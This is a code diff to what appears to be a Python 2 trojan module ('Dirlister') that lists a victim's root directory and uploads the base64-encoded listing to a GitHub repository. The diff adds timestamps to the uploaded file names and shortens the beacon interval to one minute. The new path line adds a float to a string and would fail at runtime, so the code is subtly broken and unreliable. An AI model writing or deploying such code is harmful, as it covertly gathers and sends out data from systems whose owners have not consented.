@@ -13,7 +13,7 @@ auto_save = True
 def save(pl):
     #data/id/host/module_dia_mes_ano_hora:mim.data
     
-    data_remote_path = "data/%s/%s/%s.data" %(id,host, module_name)
+    data_remote_path = "data/%s/%s/%s.data" %(id,host, module_name+"_"+time.time())
     repo.create_file(data_remote_path,"Commit message",base64.b64encode(pl))
 
 def run(*args):
@@ -21,4 +21,4 @@ def run(*args):
         print "[*] Dirlister fired up"
         list = str(os.listdir("/"))
         save(list)
-        time.sleep(5*60)
+        time.sleep(1*60)
